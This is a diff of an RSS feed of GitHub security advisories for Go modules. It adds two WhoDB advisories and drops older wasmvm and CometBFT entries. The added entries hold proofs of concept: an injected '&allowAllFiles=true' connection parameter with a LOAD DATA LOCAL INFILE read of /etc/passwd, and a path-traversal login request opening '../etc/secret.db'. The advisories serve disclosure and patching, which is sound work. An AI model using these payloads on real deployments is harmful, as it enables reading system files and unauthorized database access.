@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2025-02-06T19:01:27.528Z</updated>
+    <updated>2025-02-06T20:01:22.826Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,134 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/clidey/whodb/core] WhoDB allows parameter injection in DB connection URIs leading to local file inclusion]]></title>
+        <id>https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</id>
+        <link href="https://github.com/advisories/GHSA-c7w4-9wv8-7x7c"/>
+        <updated>2025-02-06T19:58:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The application is vulnerable to parameter injection in database connection strings, which allows an attacker to read local files on the machine the application is running on.</p>
+<h3 id="details">Details</h3>
+<p>The application uses string concatenation to build database connection URIs which are then passed to corresponding libraries responsible for setting up the database connections.</p>
+<p>This string concatenation is done unsafely and without escaping or encoding the user input. This allows an user, in many cases, to inject arbitrary parameters into the URI string. These parameters can be potentially dangerous depending on the libraries used.</p>
+<p>One of these dangerous parameters is <code>allowAllFiles</code> in the library <code>github.com/go-sql-driver/mysql</code>. Should this be set to <code>true</code>, the library enables running the <code>LOAD DATA LOCAL INFILE</code> query on any file on the host machine (in this case, the machine that WhoDB is running on). Source: <a href="https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128">https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></p>
+<p>By injecting <code>&amp;allowAllFiles=true</code> into the connection URI and connecting to any MySQL server (such as an attacker-controlled one), the attacker is able to read local files.</p>
+<h3 id="poc">PoC</h3>
+<p>As this vulnerability does not require sending requests manually and can all be done using the WhoDB UI, screenshots are provided instead of HTTP requests.</p>
+<p>For this proof-of-concept, a clean instance of WhoDB and MySQL were set up using podman (docker is a suitable alternative):</p>
+<pre><code>podman network create whodb-poc
+podman run -d -p 8080:8080 --network whodb-poc docker.io/clidey/whodb
+podman run -d --name mysql -e MYSQL_ROOT_PASSWORD=password --network whodb-poc docker.io/mysql:9
+</code></pre>
+<p>The attacker connects to the database via WhoDB. Note that in the <code>Loc</code> field, the string <code>&amp;allowAllFiles=true</code> is inserted:</p>
+<p><img alt="2025-01-21-13-28-08" src="https://github.com/user-attachments/assets/28709707-97e4-4d26-b61c-5462db6dd43f"></p>
+<p>After connecting, the attacker navigates to the scratchpad in <code>/scratchpad</code>.</p>
+<p>The attacker first creates a demo table:</p>
+<pre><code class="language-sql">CREATE TABLE poc (
+    line TEXT
+);
+</code></pre>
+<p>The attacker then enables loading files from the server side. For the sake of clarity, do note that while this is required, the file is not being read from the remote server where MySQL is running, but the local machine that WhoDB is running on.</p>
+<pre><code class="language-sql">SET GLOBAL local_infile=1;
+</code></pre>
+<p>The attacker then uses the <code>LOAD DATA LOCAL INFILE</code> statement to read the contents of <code>/etc/passwd</code> (in this case from inside the container where WhoDB is running) into the previously created table:</p>
+<pre><code class="language-sql">LOAD DATA LOCAL INFILE '/etc/passwd'
+INTO TABLE poc
+FIELDS TERMINATED BY '\0'
+LINES TERMINATED BY '\n';
+</code></pre>
+<p>The attacker then navigates to the <code>poc</code> table in the <em>Tables</em> view and observes that the file has been read successfully:</p>
+<p><img alt="2025-01-21-14-04-47" src="https://github.com/user-attachments/assets/c8f499ce-0d40-49ba-a2c6-fe2d12c677c5"></p>
+<h3 id="impact">Impact</h3>
+<p>While this proof-of-concept demonstrates local file inclusion, the root cause of the issue is the unsafe construction of database connection URIs from user input. Not all database connector libraries used in WhoDB were inspected; there may be libraries which allow for even more impactful parameters.</p>
+<p>The attack requires no user authentication to WhoDB (only authentication to any database server, such as an attacker-controlled one) and no special configuration - the default configuration of the application is vulnerable.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c">https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c</a></li>
+<li><a href="https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1">https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1</a></li>
+<li><a href="https://github.com/advisories/GHSA-c7w4-9wv8-7x7c">https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-02-06T19:58:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/clidey/whodb/core] WhoDB has a path traversal opening Sqlite3 database]]></title>
+        <id>https://github.com/advisories/GHSA-9r4c-jwx3-3j76</id>
+        <link href="https://github.com/advisories/GHSA-9r4c-jwx3-3j76"/>
+        <updated>2025-02-06T19:58:25.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>While the application only displays Sqlite3 databases present in the directory <code>/db</code>, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.</p>
+<h3 id="details">Details</h3>
+<p>WhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in <code>/db/</code> (or alternatively <code>./tmp/</code> if development mode is enabled). Source: <a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></p>
+<p>If no databases are present in the default directory, the UI indicates that the user is unable to open any databases:</p>
+<p><img alt="2025-01-22-12-12-42" src="https://github.com/user-attachments/assets/98ffbcf6-907d-4f90-bf11-2c921b2d93b3"></p>
+<p>The database file is an user-controlled value. This value is used in <code>.Join()</code> with the default directory, in order to get the full path of the database file to open. Source: <a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></p>
+<p>No checks are performed whether the database file that is eventually opened actually resides in the default directory <code>/db</code>.</p>
+<p>This allows an attacker to use path traversal (<code>../../</code>) in order to open any Sqlite3 database present on the system. </p>
+<h3 id="poc">PoC</h3>
+<p>Before running the container, an example Sqlite3 database with dummy "secret" data was created:</p>
+<pre><code class="language-sh">DB_FILE=$(mktemp)
+echo "CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES ('secret data')" | sqlite3 "$DB_FILE"
+</code></pre>
+<p>The container was then created with nothing mounted into <code>/db</code>, and the dummy database mounted into <code>/etc/secret.db</code>:</p>
+<pre><code class="language-sh">podman run -d -p 8080:8080 -v "$DB_FILE":/etc/secret.db docker.io/clidey/whodb
+</code></pre>
+<p>The attacker sends a HTTP request to determine whether the <code>secret.db</code> is accessible by setting the <code>Database</code> value to <code>../etc/secret.db</code>:</p>
+<pre><code class="language-http">POST /api/query HTTP/1.1
+Host: localhost:8080
+content-type: application/json
+...
+
+{"operationName":"Login","variables":{"credentials":{"Type":"Sqlite3","Hostname":"","Database":"../etc/secret.db","Username":"","Password":"","Advanced":[]}},"query":"mutation Login($credentials: LoginCredentials!) {\n  Login(credentials: $credentials) {\n    Status\n    __typename\n  }\n}"}
+</code></pre>
+<p>The server response indicates that the database was successfully opened:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Type: application/json
+Set-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=/; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly
+...
+
+{"data":{"Login":{"Status":true,"__typename":"StatusResponse"}}}
+</code></pre>
+<p>The <code>Set-Cookie</code> <code>Token</code> value is simply a Base64-encoded string with a JSON payload containing the connection details:</p>
+<pre><code class="language-json">{
+  "Type": "Sqlite3",
+  "Hostname": "",
+  "Username": "",
+  "Password": "",
+  "Database": "../etc/secret.db"
+}
+</code></pre>
+<p>The attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the <code>Database</code> value to <code>../etc/secret.db</code>.</p>
+<p>Doing so, the attacker can then browse the database, its tables and the data within:</p>
+<p><img alt="2025-01-22-12-36-25" src="https://github.com/user-attachments/assets/c28f1273-7a3c-49e8-bb73-d08a09c7521d"></p>
+<p>The attacker may also insert or modify data using either the buttons presented in the UI or the <em>Scratchpad</em> functionality. In this proof-of-concept, the attacker inserts a new row using the <em>Add Row</em> button:</p>
+<p><img alt="2025-01-22-12-36-49" src="https://github.com/user-attachments/assets/dbd86beb-9969-464c-9a28-a19d470d0f52"></p>
+<h3 id="impact">Impact</h3>
+<p>Allows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.</p>
+<p>The attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.</p>
+<h3 id="recommendations">Recommendations</h3>
+<p>Before attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76">https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76</a></li>
+<li><a href="https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc">https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc</a></li>
+<li><a href="https://github.com/advisories/GHSA-9r4c-jwx3-3j76">https://github.com/advisories/GHSA-9r4c-jwx3-3j76</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9r4c-jwx3-3j76</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-02-06T19:58:24.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/plentico/plenti] Plenti  - Code Injection - Denial of Services]]></title>
         <id>https://github.com/advisories/GHSA-mj4v-hp69-27x5</id>
@@ -906,151 +1034,5 @@ program by reporting a bug, please see <a href="https://hackerone.com/cosmos">ht
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-02-04T18:54:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/CosmWasm/wasmvm] wasmvm: Malicious smart contract can crash the chain]]></title>
-        <id>https://github.com/advisories/GHSA-23qp-3c2m-xx6w</id>
-        <link href="https://github.com/advisories/GHSA-23qp-3c2m-xx6w"/>
-        <updated>2025-02-06T18:03:01.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="cwa-2025-001">CWA-2025-001</h1>
-<p><strong>Severity</strong></p>
-<p>Medium (Moderate + Likely)[^1]</p>
-<p><strong>Affected versions:</strong></p>
-<ul>
-<li>wasmvm &gt;= 2.2.0, &lt; 2.2.2</li>
-<li>wasmvm &gt;= 2.1.0, &lt; 2.1.5</li>
-<li>wasmvm &gt;= 2.0.0, &lt; 2.0.6</li>
-<li>wasmvm &lt; 1.5.8</li>
-</ul>
-<p><strong>Patched versions:</strong></p>
-<ul>
-<li>wasmvm 1.5.8, 2.0.6, 2.1.5, 2.2.2</li>
-</ul>
-<h2 id="description-of-the-bug">Description of the bug</h2>
-<p>The vulnerability can be used to crash the chain. The underlying bug that causes this is present on both permissioned and premissionless chains, but it can only be triggered <em>reliably</em> with a malicious contract, so permissioned chains are much less likely to be affected.</p>
-<p>(We'll add more detail once chains had a chance to upgrade.)</p>
-<h2 id="patch">Patch</h2>
-<ul>
-<li>1.5: <a href="https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea">https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea</a></li>
-<li>2.0: <a href="https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678">https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678</a></li>
-<li>2.1: <a href="https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d">https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d</a></li>
-<li>2.2: <a href="https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d">https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d</a></li>
-</ul>
-<h2 id="applying-the-patch">Applying the patch</h2>
-<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>
-<ol>
-<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>
-<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to one of the patched version
-depending on which minor version you are on; <code>go mod tidy</code>; commit.</li>
-<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>
-<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.8, 2.0.6, 2.1.5 or 2.2.2.</li>
-<li>Follow your regular practices to deploy chain upgrades.</li>
-</ol>
-<p>While the fix for this issue is not consensus breaking, the patch contains another
-consensus breaking fix and requires a coordinated upgrade.</p>
-<h2 id="acknowledgement">Acknowledgement</h2>
-<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>
-<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the
-program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2024-11-25: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>
-<li>2024-11-28: Confio security contributors confirm the report.</li>
-<li>2024-11-28: Confio developed the patch internally.</li>
-<li>2025-02-04: Patch gets released.</li>
-</ul>
-<p>[^1]: following Amulet's Severity Classification Framework ACMv1.2: <a href="https://github.com/interchainio/security/blob/0295254e8645301ccb606d46108a45cede0a73e0/resources/CLASSIFICATION_MATRIX.md">https://github.com/interchainio/security/blob/0295254e8645301ccb606d46108a45cede0a73e0/resources/CLASSIFICATION_MATRIX.md</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-23qp-3c2m-xx6w">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-23qp-3c2m-xx6w</a></li>
-<li><a href="https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d">https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d</a></li>
-<li><a href="https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea">https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea</a></li>
-<li><a href="https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d">https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d</a></li>
-<li><a href="https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678">https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678</a></li>
-<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2025-3448">https://pkg.go.dev/vuln/GO-2025-3448</a></li>
-<li><a href="https://github.com/advisories/GHSA-23qp-3c2m-xx6w">https://github.com/advisories/GHSA-23qp-3c2m-xx6w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-23qp-3c2m-xx6w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-02-04T18:54:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT allows a malicious peer to stall the network by disseminating seemingly valid block parts]]></title>
-        <id>https://github.com/advisories/GHSA-r3r4-g7hq-pq4f</id>
-        <link href="https://github.com/advisories/GHSA-r3r4-g7hq-pq4f"/>
-        <updated>2025-02-05T16:34:59.000Z</updated>
-        <content type="html"><![CDATA[<p>Name: ASA-2025-002: Malicious peer can stall network by disseminating seemingly valid block parts
-Component: CometBFT
-Criticality: High (Catastrophic Impact; Possible Likelihood per <a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>)
-Affected versions: &lt;= v0.38.16, v1.0.0
-Affected users: Validators, Full nodes, Users</p>
-<h3 id="description">Description</h3>
-<p>A bug was identified in the CometBFT validation of block part indices and the corresponding proof part indices that can lead to incorrect processing and dissemination of invalid parts, which in turn could lead to a network halt. Additional validation was added to prevent this condition from happening.</p>
-<h3 id="patches">Patches</h3>
-<p>The new CometBFT releases <a href="https://github.com/cometbft/cometbft/releases/tag/v1.0.1">v1.0.1</a> and <a href="https://github.com/cometbft/cometbft/releases/tag/v0.38.17">v0.38.17</a> fix this issue.</p>
-<p>Unreleased code in the main branch is patched as well.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There are no known workarounds for this issue. If a node is producing these malicious proofs, the only mitigation is to upgrade CometBFT. After upgrading, the validators then will eventually conclude the correct value.</p>
-<h3 id="technical-deep-dive">Technical Deep-Dive</h3>
-<p>When the next proposer creates a block, it is split into many block parts (64kB each). Each block part is then disseminated via p2p layer in a gossip fashion. The block part contains the following fields:</p>
-<pre><code class="language-go">type Part struct {
-    Index uint32            `json:"index"`
-    Bytes cmtbytes.HexBytes `json:"bytes"`
-    Proof merkle.Proof      `json:"proof"`
-}
-</code></pre>
-<ul>
-<li><code>Index</code> - represents the index of a block part</li>
-<li><code>Bytes</code> - the actual content</li>
-<li><code>Proof</code> - Merkle proof, which allows the receiving node to quickly verify that a <code>Part</code> is indeed a piece of the proposed block.</li>
-</ul>
-<p>The <code>Proof</code> contains the following fields:</p>
-<pre><code class="language-go">type Proof struct {
-    Total    int64    `json:"total"`           // Total number of items.
-    Index    int64    `json:"index"`           // Index of item to prove.
-    LeafHash []byte   `json:"leaf_hash"`       // Hash of item value.
-    Aunts    [][]byte `json:"aunts,omitempty"` // Hashes from leaf's sibling to a root's child.
-}
-</code></pre>
-<p>Note that the total number of leaves in the Merkle tree equals the number of parts in the proposed block. Previously, CometBFT did not validate the <code>Index</code> field and specifically that <code>Part.Index</code> must be equal to <code>Part.Proof.Index</code>. This leads to a condition where, it is possible to use the proof from a different part and CometBFT accept it, even though the proof proves the different part is a piece of the proposed block and not the part that the peer actually sent to us.</p>
-<p>This condition is problematic because: </p>
-<ol>
-<li>it would disseminate the invalid block part to its neighboring nodes (because it deemed it as correct)</li>
-<li>it would mark the block part as received and ask the neighboring nodes not to relay it in the future, making it impossible to receive the correct block part.</li>
-</ol>
-<p>To address this, CometBFT was patched to verify that <code>Part.Index</code> is equal to <code>Part.Proof.Index</code>, preventing the above condition.</p>
-<h3 id="timeline">Timeline</h3>
-<ul>
-<li>January 15, 2025, 12:12pm PST: Issue reported to the Cosmos Bug Bounty program</li>
-<li>January 15, 2025, 12:31pm PST: Issue triaged by Amulet on-call, and distributed to Core team</li>
-<li>January 27, 2025, 11:28pm PST: Core team completes validation of issue</li>
-<li>January 31, 2024, 2:15pm PST: Pre-notification delivered</li>
-<li>February 3rd, 2024, 9:00am UTC+4: Patch made available</li>
-</ul>
-<p>This issue was reported by <a href="https://github.com/unknownfeature">unknown_feature</a> to the Cosmos Bug Bounty Program on HackerOne on January 15, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
-<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>. For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.  </p>
-<p>A Github Security Advisory for this issue is available in the CometBFT <a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-r3r4-g7hq-pq4f">repository</a>. For more information about CometBFT, see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-r3r4-g7hq-pq4f">https://github.com/cometbft/cometbft/security/advisories/GHSA-r3r4-g7hq-pq4f</a></li>
-<li><a href="https://github.com/cometbft/cometbft/commit/f943aabc7b9201ea1089ff3381479929435ce424">https://github.com/cometbft/cometbft/commit/f943aabc7b9201ea1089ff3381479929435ce424</a></li>
-<li><a href="https://github.com/cometbft/cometbft/commit/415c0da223bb7694608913f725fa45bd7a7a46bf">https://github.com/cometbft/cometbft/commit/415c0da223bb7694608913f725fa45bd7a7a46bf</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2025-3443">https://pkg.go.dev/vuln/GO-2025-3443</a></li>
-<li><a href="https://github.com/advisories/GHSA-r3r4-g7hq-pq4f">https://github.com/advisories/GHSA-r3r4-g7hq-pq4f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r3r4-g7hq-pq4f</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-02-03T16:48:59.000Z</published>
     </entry>
 </feed>
